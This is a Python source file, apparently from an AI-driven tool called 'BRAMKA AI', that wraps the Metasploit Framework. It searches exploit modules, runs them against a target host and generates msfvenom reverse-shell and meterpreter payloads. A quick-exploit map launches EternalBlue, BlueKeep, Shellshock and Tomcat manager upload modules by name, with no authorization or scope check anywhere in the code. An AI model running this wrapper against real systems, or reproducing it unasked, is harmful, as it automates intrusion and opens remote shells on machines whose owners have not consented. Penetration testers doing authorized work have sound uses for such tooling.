"""
BRAMKA AI - Metasploit Framework Wrapper
Professional exploitation framework integration
"""

import asyncio
import json
import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum
import subprocess
from pathlib import Path

from src.utils.logger import get_logger
from src.utils.config_loader import get_config


@dataclass
class ExploitResult:
    """Metasploit exploit result"""
    exploit_name: str
    target: str
    success: bool
    session_id: Optional[str]
    output: str
    payload_used: Optional[str]
    error: Optional[str] = None


class MetasploitWrapper:
    """
    Metasploit Framework wrapper for exploitation
    
    Features:
    - Module search
    - Exploit execution
    - Payload generation
    - Session management
    - Meterpreter interaction
    """
    
    def __init__(self):
        self.logger = get_logger("MetasploitWrapper")
        self.config = get_config()
        
        # Metasploit paths
        self.msfconsole = "msfconsole"
        self.msfvenom = "msfvenom"
        
        # Verify installation
        self._verify_metasploit()
        
        self.logger.info("✅ Metasploit wrapper initialized")
    
    def _verify_metasploit(self):
        """Verify Metasploit is installed"""
        try:
            result = subprocess.run(
                ['msfconsole', '--version'],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                version = result.stdout.strip().split('\n')[0]
                self.logger.info(f"Metasploit found: {version}")
            else:
                raise RuntimeError("Metasploit not found")
        except Exception as e:
            self.logger.error(f"❌ Metasploit verification failed: {e}")
            raise RuntimeError("Metasploit is not installed or not in PATH")
    
    async def search_exploit(self, search_term: str) -> List[Dict[str, str]]:
        """
        Search for exploits/modules
        
        Args:
            search_term: Search query (e.g., "apache", "windows smb")
        
        Returns:
            List of matching modules
        """
        self.logger.info(f"🔍 Searching Metasploit for: {search_term}")
        
        try:
            # Build msfconsole command
            cmd = f"search {search_term}"
            
            process = await asyncio.create_subprocess_exec(
                self.msfconsole,
                '-q', '-x', f"{cmd}; exit",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=30
            )
            
            output = stdout.decode()
            
            # Parse search results
            modules = self._parse_search_results(output)
            
            self.logger.info(f"✅ Found {len(modules)} modules")
            return modules
            
        except Exception as e:
            self.logger.error(f"❌ Search failed: {e}")
            return []
    
    def _parse_search_results(self, output: str) -> List[Dict[str, str]]:
        """Parse msfconsole search output"""
        modules = []
        
        # Look for lines with module paths
        for line in output.split('\n'):
            # Metasploit search format: "exploit/windows/smb/ms17_010_eternalblue"
            if 'exploit/' in line or 'auxiliary/' in line or 'post/' in line:
                parts = line.split()
                if parts:
                    module_path = parts[0]
                    # Try to extract description
                    description = ' '.join(parts[1:]) if len(parts) > 1 else ""
                    
                    modules.append({
                        'path': module_path,
                        'description': description,
                        'type': module_path.split('/')[0] if '/' in module_path else 'unknown'
                    })
        
        return modules
    
    async def run_exploit(
        self,
        exploit_path: str,
        target: str,
        options: Optional[Dict[str, str]] = None,
        payload: str = "generic/shell_reverse_tcp",
        lhost: str = "0.0.0.0",
        lport: int = 4444
    ) -> ExploitResult:
        """
        Run Metasploit exploit
        
        Args:
            exploit_path: Path to exploit module (e.g., "exploit/windows/smb/ms17_010_eternalblue")
            target: Target IP/hostname
            options: Additional exploit options
            payload: Payload to use
            lhost: Listener host
            lport: Listener port
        
        Returns:
            ExploitResult object
        """
        self.logger.info(f"⚔️ Running exploit: {exploit_path} against {target}")
        
        try:
            # Build msfconsole resource script
            commands = [
                f"use {exploit_path}",
                f"set RHOSTS {target}",
                f"set PAYLOAD {payload}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}"
            ]
            
            # Add custom options
            if options:
                for key, value in options.items():
                    commands.append(f"set {key} {value}")
            
            # Add exploit command
            commands.append("exploit")
            commands.append("exit")
            
            # Create resource file
            rc_file = Path("/tmp/bramka_msf.rc")
            rc_file.write_text('\n'.join(commands))
            
            # Execute
            process = await asyncio.create_subprocess_exec(
                self.msfconsole,
                '-q', '-r', str(rc_file),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=120
            )
            
            output = stdout.decode()
            
            # Parse results
            success = self._check_exploit_success(output)
            session_id = self._extract_session_id(output)
            
            # Cleanup
            rc_file.unlink(missing_ok=True)
            
            if success:
                self.logger.info(f"✅ Exploit successful! Session: {session_id}")
            else:
                self.logger.warning("⚠️ Exploit may have failed")
            
            return ExploitResult(
                exploit_name=exploit_path,
                target=target,
                success=success,
                session_id=session_id,
                output=output,
                payload_used=payload
            )
            
        except Exception as e:
            self.logger.error(f"❌ Exploit execution failed: {e}")
            return ExploitResult(
                exploit_name=exploit_path,
                target=target,
                success=False,
                session_id=None,
                output="",
                payload_used=payload,
                error=str(e)
            )
    
    def _check_exploit_success(self, output: str) -> bool:
        """Check if exploit was successful"""
        success_indicators = [
            "Meterpreter session",
            "Command shell session",
            "session opened",
            "Exploit completed"
        ]
        
        output_lower = output.lower()
        return any(indicator.lower() in output_lower for indicator in success_indicators)
    
    def _extract_session_id(self, output: str) -> Optional[str]:
        """Extract session ID from output"""
        # Look for pattern like "Meterpreter session 1 opened"
        match = re.search(r'session (\d+) opened', output, re.IGNORECASE)
        if match:
            return match.group(1)
        return None
    
    async def generate_payload_msfvenom(
        self,
        payload_type: str = "windows/meterpreter/reverse_tcp",
        lhost: str = "0.0.0.0",
        lport: int = 4444,
        output_format: str = "exe",
        output_file: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Generate payload using msfvenom
        
        Args:
            payload_type: Payload type
            lhost: Listener host
            lport: Listener port
            output_format: Output format (exe, elf, raw, etc.)
            output_file: Output file path
        
        Returns:
            Generation result
        """
        self.logger.info(f"🔨 Generating payload: {payload_type}")
        
        try:
            # Build msfvenom command
            cmd = [
                self.msfvenom,
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', output_format
            ]
            
            if output_file:
                cmd.extend(['-o', output_file])
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=60
            )
            
            if process.returncode == 0:
                self.logger.info("✅ Payload generated successfully")
                return {
                    "success": True,
                    "payload_type": payload_type,
                    "format": output_format,
                    "output_file": output_file,
                    "raw_payload": stdout.decode() if not output_file else None
                }
            else:
                error = stderr.decode()
                self.logger.error(f"❌ Payload generation failed: {error}")
                return {
                    "success": False,
                    "error": error
                }
            
        except Exception as e:
            self.logger.error(f"❌ msfvenom error: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def quick_exploit(
        self,
        vulnerability: str,
        target: str,
        lhost: str = "10.10.10.10",
        lport: int = 4444
    ) -> ExploitResult:
        """
        Quick exploit using common vulnerabilities
        
        Args:
            vulnerability: Vulnerability name (e.g., "eternalblue", "shellshock")
            target: Target IP
            lhost: Listener host
            lport: Listener port
        
        Returns:
            ExploitResult
        """
        # Common vulnerability to exploit mapping
        vuln_map = {
            "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
            "bluekeep": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            "heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
            "tomcat": "exploit/multi/http/tomcat_mgr_upload"
        }
        
        exploit_path = vuln_map.get(vulnerability.lower())
        
        if not exploit_path:
            self.logger.error(f"❌ Unknown vulnerability: {vulnerability}")
            return ExploitResult(
                exploit_name=vulnerability,
                target=target,
                success=False,
                session_id=None,
                output="",
                payload_used=None,
                error=f"Unknown vulnerability: {vulnerability}"
            )
        
        return await self.run_exploit(
            exploit_path=exploit_path,
            target=target,
            lhost=lhost,
            lport=lport
        )


# Testing
async def test_metasploit():
    """Test Metasploit wrapper"""
    from src.utils.logger import setup_logger
    
    setup_logger(log_level="INFO")
    
    msf = MetasploitWrapper()
    
    print("\n" + "="*60)
    print("Testing Metasploit Wrapper")
    print("="*60)
    
    # Test search
    print("\n1. Search for 'apache' exploits:")
    results = await msf.search_exploit("apache")
    print(f"   Found {len(results)} modules")
    if results:
        print(f"   Example: {results[0]['path']}")
    
    # Test payload generation
    print("\n2. Generate test payload:")
    payload = await msf.generate_payload_msfvenom(
        "linux/x86/meterpreter/reverse_tcp",
        "10.10.10.10",
        4444,
        "elf"
    )
    print(f"   Success: {payload['success']}")
    
    print("\n" + "="*60)
    print("✅ Metasploit wrapper tests complete")
    print("="*60)


if __name__ == "__main__":
    asyncio.run(test_metasploit())
